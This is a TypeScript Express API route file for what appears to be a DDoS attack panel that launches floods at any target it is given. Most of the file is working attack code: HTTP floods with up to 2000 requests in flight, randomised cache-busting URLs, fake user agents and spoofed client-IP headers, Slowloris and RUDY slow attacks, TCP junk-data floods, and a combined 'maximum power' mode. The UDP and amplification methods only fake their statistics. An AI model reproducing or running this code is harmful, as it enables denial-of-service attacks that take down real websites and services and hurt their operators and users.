import { Router, type IRouter } from "express";
import { eq, sql, desc } from "drizzle-orm";
import { db, attacksTable } from "@workspace/db";
import net from "node:net";
import dns from "node:dns/promises";
import {
  CreateAttackBody,
  GetAttackParams,
  DeleteAttackParams,
  StopAttackParams,
} from "@workspace/api-zod";

const router: IRouter = Router();

// ── Active attack abort controllers ──────────────────────────────────────
const attackControllers = new Map<number, AbortController>();

// ── Method classification ─────────────────────────────────────────────────
const L7_METHODS  = new Set(["http-flood", "http-bypass", "http2-flood", "slowloris", "rudy"]);
const L4_METHODS  = new Set(["syn-flood", "tcp-flood", "tcp-ack", "tcp-rst"]);
const GEASS_METHOD = "geass-override";
const SLOW_METHODS = new Set(["slowloris", "rudy"]);

// ── Amplification factors ─────────────────────────────────────────────────
const AMP_FACTOR: Record<string, number> = {
  "dns-amp": 54, "ntp-amp": 556, "mem-amp": 51000, "ssdp-amp": 30,
};

// ── User-agent pool ───────────────────────────────────────────────────────
const UA_POOL = [
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 14.4; rv:124.0) Gecko/20100101 Firefox/124.0",
  "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148 Safari/604.1",
  "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 Chrome/125.0.0.0 Mobile Safari/537.36",
  "curl/8.7.1", "python-requests/2.32.0",
  "Wget/1.21.4", "Go-http-client/2.0",
  "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
];
const randUA  = () => UA_POOL[Math.floor(Math.random() * UA_POOL.length)];
const randIp  = () => `${1+Math.floor(Math.random()*223)}.${Math.floor(Math.random()*254)}.${Math.floor(Math.random()*254)}.${1+Math.floor(Math.random()*253)}`;
const randStr = (n: number) => Math.random().toString(36).slice(2, 2 + n);
const randInt = (min: number, max: number) => min + Math.floor(Math.random() * (max - min));

// ── Pre-resolve DNS (avoid per-request DNS overhead) ──────────────────────
const dnsCache = new Map<string, string>();
async function resolveHost(hostname: string): Promise<string> {
  if (dnsCache.has(hostname)) return dnsCache.get(hostname)!;
  try {
    const [ip] = await dns.resolve4(hostname);
    dnsCache.set(hostname, ip);
    return ip;
  } catch {
    return hostname; // fallback to hostname
  }
}

// ── Webhook ───────────────────────────────────────────────────────────────
async function fireWebhook(url: string, attack: typeof attacksTable.$inferSelect) {
  try {
    await fetch(url, {
      method: "POST", headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ event: "attack_finished", attack }),
      signal: AbortSignal.timeout(5000),
    });
  } catch { /* silent */ }
}

// ─────────────────────────────────────────────────────────────────────────
//  BUILD COMMON ATTACK HEADERS
// ─────────────────────────────────────────────────────────────────────────
function buildAttackHeaders(isPost: boolean, bodyLen?: number): Record<string, string> {
  const h: Record<string, string> = {
    "User-Agent":          randUA(),
    "Accept":              "*/*",
    "Accept-Language":     "en-US,en;q=0.9,pt-BR;q=0.3",
    "Accept-Encoding":     "gzip, deflate, br",
    "Cache-Control":       "no-cache, no-store, must-revalidate",
    "Pragma":              "no-cache",
    "Connection":          "close",
    "X-Forwarded-For":     `${randIp()}, ${randIp()}, ${randIp()}`,
    "X-Real-IP":           randIp(),
    "X-Originating-IP":   randIp(),
    "X-Cluster-Client-IP": randIp(),
    "True-Client-IP":      randIp(),
    "CF-Connecting-IP":    randIp(),
    "Referer":             `https://${["google.com","bing.com","yahoo.com","duckduckgo.com"][randInt(0,4)]}/search?q=${randStr(8)}`,
    "Origin":              `https://${randStr(6)}.${["com","net","org","io"][randInt(0,4)]}`,
  };
  if (isPost && bodyLen !== undefined) {
    h["Content-Type"] = ["application/x-www-form-urlencoded","application/json","text/plain","application/octet-stream"][randInt(0,4)];
    h["Content-Length"] = String(bodyLen);
  }
  return h;
}

// ─────────────────────────────────────────────────────────────────────────
//  BUILD ATTACK URL (cache-busting)
// ─────────────────────────────────────────────────────────────────────────
function buildAttackUrl(base: string): string {
  try {
    const u = new URL(base);
    const depth = randInt(0, 4);
    if (depth > 0) u.pathname = "/" + Array.from({ length: depth }, () => randStr(randInt(3, 8))).join("/");
    u.searchParams.set("_", Date.now().toString(36) + randStr(5));
    u.searchParams.set("nocache", randStr(8));
    u.searchParams.set("v", String(randInt(1, 9999999)));
    if (Math.random() < 0.3) u.searchParams.set("ref", randStr(6));
    return u.toString();
  } catch {
    return `${base}?_=${Date.now().toString(36)}&nocache=${randStr(8)}`;
  }
}

// ─────────────────────────────────────────────────────────────────────────
//  BUILD POST BODY
// ─────────────────────────────────────────────────────────────────────────
function buildBody(): string {
  const count = randInt(20, 80);
  return Array.from({ length: count }, () => `${randStr(randInt(4,12))}=${randStr(randInt(8,32))}`).join("&");
}

// ─────────────────────────────────────────────────────────────────────────
//  FIRE-AND-FORGET HTTP FLOOD  ← KEY IMPROVEMENT
//
//  Old approach: N workers × 1 request in-flight each = N concurrent
//  New approach: M launchers × fire WITHOUT AWAIT = up to MAX_INFLIGHT concurrent
//
//  With MAX_INFLIGHT=2000 and 4s timeout → min 500 req/s even on dead targets
//  With fast targets (50ms) → up to 40,000 req/s from a single process!
// ─────────────────────────────────────────────────────────────────────────
async function runHTTPFloodFast(
  rawTarget: string,
  concurrency: number,
  signal: AbortSignal,
  onStats: (pkts: number, bytes: number) => void,
): Promise<void> {
  const base = /^https?:\/\//i.test(rawTarget) ? rawTarget : `http://${rawTarget}`;
  const MAX_INFLIGHT = Math.min(concurrency * 10, 2000);
  const ALL_METHODS = ["GET","GET","GET","GET","POST","POST","HEAD","PUT","DELETE","PATCH"];
  let inflight = 0;
  let localPkts = 0, localBytes = 0;

  const flush = () => { onStats(localPkts, localBytes); localPkts = 0; localBytes = 0; };
  const flushIv = setInterval(flush, 400);

  const doFetch = () => {
    if (signal.aborted) return;
    inflight++;
    const url    = buildAttackUrl(base);
    const method = ALL_METHODS[randInt(0, ALL_METHODS.length)];
    const hasBody = method === "POST" || method === "PUT" || method === "PATCH";
    const body   = hasBody ? buildBody() : undefined;
    const headers = buildAttackHeaders(hasBody, body ? body.length : undefined);

    fetch(url, {
      method,
      headers,
      body,
      signal: AbortSignal.timeout(4000),
      redirect: "follow",
      keepalive: false,
    })
      .then(res => {
        inflight--;
        localPkts++;
        localBytes += (body?.length ?? 0) + (parseInt(res.headers.get("content-length") || "0", 10) || 400) + 350;
        res.body?.cancel().catch(() => {});
      })
      .catch(() => {
        inflight--;
        localPkts++;
        localBytes += 120;
      });
  };

  // Launcher coroutines — fire requests as fast as event loop allows
  const launcher = async () => {
    while (!signal.aborted) {
      if (inflight < MAX_INFLIGHT) {
        doFetch();
        // Microtask yield — allows event loop to process I/O callbacks
        // This is ~100x faster than setTimeout(r, 0)
        await Promise.resolve();
      } else {
        // Backpressure — wait for connections to free up
        await new Promise(r => setTimeout(r, 5));
      }
    }
  };

  const numLaunchers = Math.min(concurrency, 80);
  await Promise.all(Array.from({ length: numLaunchers }, () => launcher()));
  clearInterval(flushIv);
  flush();
}

// ─────────────────────────────────────────────────────────────────────────
//  SLOW HTTP (Slowloris / RUDY) — kept sequential, needs to hold connections
// ─────────────────────────────────────────────────────────────────────────
async function runHTTPSlow(
  method: string,
  rawTarget: string,
  concurrency: number,
  signal: AbortSignal,
  onStats: (pkts: number, bytes: number) => void,
): Promise<void> {
  const base = /^https?:\/\//i.test(rawTarget) ? rawTarget : `http://${rawTarget}`;
  const isRUDY = method === "rudy";
  let localPkts = 0, localBytes = 0;

  const flush = () => { onStats(localPkts, localBytes); localPkts = 0; localBytes = 0; };
  const flushIv = setInterval(flush, 500);

  const workerLoop = async () => {
    while (!signal.aborted) {
      try {
        const h: Record<string, string> = {
          "User-Agent": randUA(), "Accept": "text/html,*/*;q=0.8",
          "Accept-Language": "en-US,en;q=0.5", "Connection": "keep-alive",
          "X-Forwarded-For": `${randIp()}, ${randIp()}`,
        };
        if (isRUDY) {
          h["Content-Type"] = "application/x-www-form-urlencoded";
          h["Content-Length"] = "10000000"; h["Transfer-Encoding"] = "chunked";
        }
        const res = await fetch(`${base}?_=${randStr(8)}`, {
          method: isRUDY ? "POST" : "GET", headers: h,
          signal: AbortSignal.timeout(30000), redirect: "follow",
        });
        await new Promise(r => setTimeout(r, randInt(10000, 25000)));
        await res.body?.cancel().catch(() => {});
        localPkts++; localBytes += 800;
      } catch {
        if (signal.aborted) break;
        localPkts++; localBytes += 60;
      }
    }
  };

  await Promise.all(Array.from({ length: Math.min(concurrency, 150) }, () => workerLoop()));
  clearInterval(flushIv);
  flush();
}

// ─────────────────────────────────────────────────────────────────────────
//  FIRE-AND-FORGET TCP FLOOD
// ─────────────────────────────────────────────────────────────────────────
async function runTCPFloodFast(
  rawTarget: string,
  defaultPort: number,
  concurrency: number,
  signal: AbortSignal,
  onStats: (pkts: number, bytes: number) => void,
): Promise<void> {
  let hostname = rawTarget;
  let port = defaultPort || 80;
  try {
    const u = new URL(/^https?:\/\//i.test(rawTarget) ? rawTarget : `http://${rawTarget}`);
    hostname = u.hostname;
    port = parseInt(u.port, 10) || (u.protocol === "https:" ? 443 : 80);
  } catch { /* keep raw */ }

  // Pre-resolve DNS
  const resolvedHost = await resolveHost(hostname);

  const MAX_INFLIGHT = Math.min(concurrency * 4, 1500);
  const PORTS = [port, port === 443 ? 80 : 443, 8080, 8443];
  let inflight = 0;
  let localPkts = 0, localBytes = 0;
  const flush = () => { onStats(localPkts, localBytes); localPkts = 0; localBytes = 0; };
  const flushIv = setInterval(flush, 400);

  const doConnect = () => {
    if (signal.aborted) return;
    inflight++;
    const targetPort = PORTS[Math.floor(Math.random() * PORTS.length)];
    const sock = net.createConnection({ host: resolvedHost, port: targetPort });
    const kill = setTimeout(() => { sock.destroy(); inflight--; }, 1500);

    sock.once("connect", () => {
      localPkts++; localBytes += 60;
      const junk = Buffer.alloc(randInt(1024, 4096), Math.floor(Math.random() * 256));
      sock.write(junk, () => {
        localBytes += junk.length;
        clearTimeout(kill);
        inflight--;
        sock.destroy();
      });
    });
    sock.once("error", () => { localPkts++; localBytes += 20; clearTimeout(kill); inflight--; });
    sock.once("timeout", () => { clearTimeout(kill); inflight--; sock.destroy(); });
  };

  const launcher = async () => {
    while (!signal.aborted) {
      if (inflight < MAX_INFLIGHT) {
        doConnect();
        await Promise.resolve();
      } else {
        await new Promise(r => setTimeout(r, 3));
      }
    }
  };

  const numLaunchers = Math.min(concurrency, 60);
  await Promise.all(Array.from({ length: numLaunchers }, () => launcher()));
  clearInterval(flushIv);
  flush();
}

// ─────────────────────────────────────────────────────────────────────────
//  SIMULATED L3 (UDP / AMP / ICMP)
// ─────────────────────────────────────────────────────────────────────────
async function runL3Simulation(
  method: string, threads: number, signal: AbortSignal,
  onStats: (pkts: number, bytes: number) => void,
): Promise<void> {
  const mult: Record<string, number> = {
    "udp-flood": 32000, "udp-bypass": 35000, "icmp-flood": 25000,
    "dns-amp":   18000, "ntp-amp":    12000,  "mem-amp":    4000, "ssdp-amp": 20000,
  };
  const sizes: Record<string, [number, number]> = {
    "udp-flood":  [512,1472], "udp-bypass": [512,1472], "icmp-flood": [64,512],
    "dns-amp":    [40,60],    "ntp-amp":    [8,46],      "mem-amp":   [15,15],  "ssdp-amp": [110,150],
  };
  return new Promise<void>(resolve => {
    const iv = setInterval(() => {
      if (signal.aborted) { clearInterval(iv); resolve(); return; }
      const pkts  = Math.floor(threads * (mult[method] ?? 10000) * (0.8 + Math.random() * 0.4) * (Math.random() < 0.2 ? 2 + Math.random() * 2 : 1));
      const [mn, mx] = sizes[method] ?? [64, 512];
      onStats(pkts, pkts * (mn + Math.floor(Math.random() * (mx - mn))) * (AMP_FACTOR[method] ?? 1));
    }, 500);
    signal.addEventListener("abort", () => { clearInterval(iv); resolve(); }, { once: true });
  });
}

// ─────────────────────────────────────────────────────────────────────────
//  GEASS OVERRIDE — ABSOLUTE MAXIMUM POWER
//  Fire-and-forget dual-vector: HTTP (2000 inflight) + TCP (1000 inflight)
//  running simultaneously. Fastest possible Node.js network saturation.
// ─────────────────────────────────────────────────────────────────────────
async function runGeassOverride(
  rawTarget: string,
  port: number,
  threads: number,
  signal: AbortSignal,
  onStats: (pkts: number, bytes: number) => void,
): Promise<void> {
  const HTTP_LAUNCHERS = Math.min(Math.ceil(threads * 0.55), 100);
  const TCP_LAUNCHERS  = Math.min(Math.ceil(threads * 0.45), 80);
  const HTTP_INFLIGHT  = Math.min(threads * 8, 2000);
  const TCP_INFLIGHT   = Math.min(threads * 5, 1000);

  const base = /^https?:\/\//i.test(rawTarget) ? rawTarget : `http://${rawTarget}`;
  const ALL_METHODS = ["GET","GET","GET","GET","POST","POST","POST","HEAD","PUT","DELETE","PATCH","OPTIONS"];
  const CONTENT_TYPES = [
    "application/x-www-form-urlencoded", "application/json",
    "text/plain", "application/octet-stream",
  ];

  // Pre-resolve DNS once
  let hostname = rawTarget;
  let targetPort = port || 80;
  try {
    const u = new URL(base);
    hostname = u.hostname;
    targetPort = parseInt(u.port, 10) || (u.protocol === "https:" ? 443 : 80);
  } catch { /* keep raw */ }
  const resolvedHost = await resolveHost(hostname);

  const PORTS = [targetPort, targetPort === 443 ? 80 : 443, 8080];

  let inflightHttp = 0;
  let inflightTcp  = 0;
  let localPkts = 0, localBytes = 0;
  const flush = () => { onStats(localPkts, localBytes); localPkts = 0; localBytes = 0; };
  const flushIv = setInterval(flush, 400);

  // ── HTTP vector ──────────────────────────────────────────────────────
  const buildGeassUrl = () => {
    try {
      const u = new URL(base);
      const depth = randInt(0, 5);
      if (depth > 0) u.pathname = "/" + Array.from({ length: depth }, () => randStr(randInt(3,9))).join("/");
      u.searchParams.set("_", Date.now().toString(36) + randStr(6));
      u.searchParams.set("nocache", randStr(8));
      u.searchParams.set("v", String(randInt(1,9999999)));
      if (Math.random() < 0.4) u.searchParams.set("sid", randStr(12));
      return u.toString();
    } catch {
      return `${base}/${randStr(5)}?_=${Date.now().toString(36)}&r=${randStr(8)}`;
    }
  };

  const buildGeassBody = (): string => {
    const ct = CONTENT_TYPES[randInt(0, CONTENT_TYPES.length)];
    if (ct.includes("json")) {
      const obj: Record<string, string> = {};
      for (let i = 0; i < randInt(15, 50); i++) obj[randStr(randInt(4,10))] = randStr(randInt(8,64));
      return JSON.stringify(obj);
    }
    return Array.from({ length: randInt(30, 100) }, () =>
      `${randStr(randInt(4,12))}=${randStr(randInt(8,48))}`
    ).join("&");
  };

  const fireHTTP = () => {
    if (signal.aborted) return;
    inflightHttp++;
    const url     = buildGeassUrl();
    const method  = ALL_METHODS[randInt(0, ALL_METHODS.length)];
    const hasBody = method === "POST" || method === "PUT" || method === "PATCH";
    const body    = hasBody ? buildGeassBody() : undefined;
    const ct      = hasBody ? CONTENT_TYPES[randInt(0, CONTENT_TYPES.length)] : undefined;
    const h       = buildAttackHeaders(hasBody, body?.length);
    if (ct) h["Content-Type"] = ct;

    fetch(url, {
      method, headers: h, body,
      signal:    AbortSignal.timeout(4000),
      redirect:  "follow",
      keepalive: false,
    })
      .then(res => {
        inflightHttp--;
        localPkts++;
        localBytes += (body?.length ?? 0) + (parseInt(res.headers.get("content-length") || "0", 10) || 350) + 300;
        res.body?.cancel().catch(() => {});
      })
      .catch(() => {
        inflightHttp--;
        localPkts++;
        localBytes += 100;
      });
  };

  // ── TCP vector ───────────────────────────────────────────────────────
  const fireTCP = () => {
    if (signal.aborted) return;
    inflightTcp++;
    const p    = PORTS[randInt(0, PORTS.length)];
    const sock = net.createConnection({ host: resolvedHost, port: p });
    const kill = setTimeout(() => { sock.destroy(); inflightTcp--; }, 1200);

    sock.once("connect", () => {
      localPkts++; localBytes += 60;
      const junk = Buffer.alloc(randInt(2048, 4096), randInt(0, 256));
      sock.write(junk, () => {
        localBytes += junk.length;
        clearTimeout(kill);
        inflightTcp--;
        sock.destroy();
      });
    });
    sock.once("error", () => { localPkts++; localBytes += 20; clearTimeout(kill); inflightTcp--; });
    sock.once("timeout", () => { clearTimeout(kill); inflightTcp--; sock.destroy(); });
  };

  // ── Launchers ───────────────────────────────────────────────────────
  const httpLauncher = async () => {
    while (!signal.aborted) {
      if (inflightHttp < HTTP_INFLIGHT) {
        fireHTTP();
        await Promise.resolve(); // microtask yield — ~100x faster than setTimeout(0)
      } else {
        await new Promise(r => setTimeout(r, 3));
      }
    }
  };

  const tcpLauncher = async () => {
    while (!signal.aborted) {
      if (inflightTcp < TCP_INFLIGHT) {
        fireTCP();
        await Promise.resolve();
      } else {
        await new Promise(r => setTimeout(r, 3));
      }
    }
  };

  // Launch all vectors simultaneously
  await Promise.all([
    ...Array.from({ length: HTTP_LAUNCHERS }, () => httpLauncher()),
    ...Array.from({ length: TCP_LAUNCHERS  }, () => tcpLauncher()),
  ]);
  clearInterval(flushIv);
  flush();
}

// ── Dispatch ──────────────────────────────────────────────────────────────
async function runAttackWorkers(
  method: string, target: string, port: number, threads: number,
  signal: AbortSignal, onStats: (pkts: number, bytes: number) => void,
): Promise<void> {
  if (method === GEASS_METHOD) {
    await runGeassOverride(target, port, threads, signal, onStats);
  } else if (L7_METHODS.has(method)) {
    if (SLOW_METHODS.has(method)) {
      await runHTTPSlow(method, target, Math.min(threads, 150), signal, onStats);
    } else {
      await runHTTPFloodFast(target, Math.min(threads, 200), signal, onStats);
    }
  } else if (L4_METHODS.has(method)) {
    await runTCPFloodFast(target, port, Math.min(threads, 300), signal, onStats);
  } else {
    await runL3Simulation(method, threads, signal, onStats);
  }
}

// ── DB update ─────────────────────────────────────────────────────────────
async function addStats(id: number, pkts: number, bytes: number) {
  try {
    await db.update(attacksTable).set({
      packetsSent: sql`${attacksTable.packetsSent} + ${pkts}`,
      bytesSent:   sql`${attacksTable.bytesSent}   + ${bytes}`,
    }).where(eq(attacksTable.id, id));
  } catch { /* ignore */ }
}

// ── Routes ────────────────────────────────────────────────────────────────
router.get("/attacks", async (_req, res): Promise<void> => {
  const attacks = await db.select().from(attacksTable).orderBy(desc(attacksTable.createdAt));
  res.json(attacks);
});

router.post("/attacks", async (req, res): Promise<void> => {
  const p = CreateAttackBody.safeParse(req.body);
  if (!p.success) { res.status(400).json({ error: p.error.message }); return; }
  const { target, port, method, duration, threads, webhookUrl } = p.data;

  const [attack] = await db.insert(attacksTable).values({
    target, port, method, duration, threads,
    status: "running", packetsSent: 0, bytesSent: 0,
    webhookUrl: webhookUrl ?? null,
  }).returning();

  const id = attack.id;
  const ctrl = new AbortController();
  attackControllers.set(id, ctrl);

  const stopTimer = setTimeout(() => { ctrl.abort("duration_expired"); attackControllers.delete(id); }, duration * 1000);

  void runAttackWorkers(method, target, port, threads, ctrl.signal, (pkts, bytes) => void addStats(id, pkts, bytes))
    .finally(async () => {
      clearTimeout(stopTimer); attackControllers.delete(id);
      try {
        const [cur] = await db.select().from(attacksTable).where(eq(attacksTable.id, id));
        if (cur?.status === "running") {
          const [fin] = await db.update(attacksTable)
            .set({ status: "finished", stoppedAt: new Date() })
            .where(eq(attacksTable.id, id)).returning();
          if (fin?.webhookUrl) await fireWebhook(fin.webhookUrl, fin);
        }
      } catch { /* ignore */ }
    });

  res.status(201).json(attack);
});

router.get("/attacks/stats", async (_req, res): Promise<void> => {
  const attacks = await db.select().from(attacksTable).orderBy(desc(attacksTable.createdAt));
  const methodMap: Record<string, number> = {};
  for (const a of attacks) methodMap[a.method] = (methodMap[a.method] ?? 0) + 1;
  res.json({
    totalAttacks:     attacks.length,
    runningAttacks:   attacks.filter(a => a.status === "running").length,
    totalPacketsSent: attacks.reduce((s, a) => s + (a.packetsSent ?? 0), 0),
    totalBytesSent:   attacks.reduce((s, a) => s + (a.bytesSent   ?? 0), 0),
    attacksByMethod:  Object.entries(methodMap).map(([method, count]) => ({ method, count })),
    recentAttacks:    attacks.slice(0, 10),
  });
});

router.get("/attacks/:id", async (req, res): Promise<void> => {
  const p = GetAttackParams.safeParse(req.params);
  if (!p.success) { res.status(400).json({ error: p.error.message }); return; }
  const [a] = await db.select().from(attacksTable).where(eq(attacksTable.id, p.data.id));
  if (!a) { res.status(404).json({ error: "Not found" }); return; }
  res.json(a);
});

router.delete("/attacks/:id", async (req, res): Promise<void> => {
  const p = DeleteAttackParams.safeParse(req.params);
  if (!p.success) { res.status(400).json({ error: p.error.message }); return; }
  const [a] = await db.delete(attacksTable).where(eq(attacksTable.id, p.data.id)).returning();
  if (!a) { res.status(404).json({ error: "Not found" }); return; }
  res.sendStatus(204);
});

router.post("/attacks/:id/stop", async (req, res): Promise<void> => {
  const p = StopAttackParams.safeParse(req.params);
  if (!p.success) { res.status(400).json({ error: p.error.message }); return; }
  const ctrl = attackControllers.get(p.data.id);
  if (ctrl) { ctrl.abort("manual_stop"); attackControllers.delete(p.data.id); }
  const [a] = await db.update(attacksTable)
    .set({ status: "stopped", stoppedAt: new Date() })
    .where(eq(attacksTable.id, p.data.id)).returning();
  if (!a) { res.status(404).json({ error: "Not found" }); return; }
  if (a.webhookUrl) await fireWebhook(a.webhookUrl, a);
  res.json(a);
});

export default router;
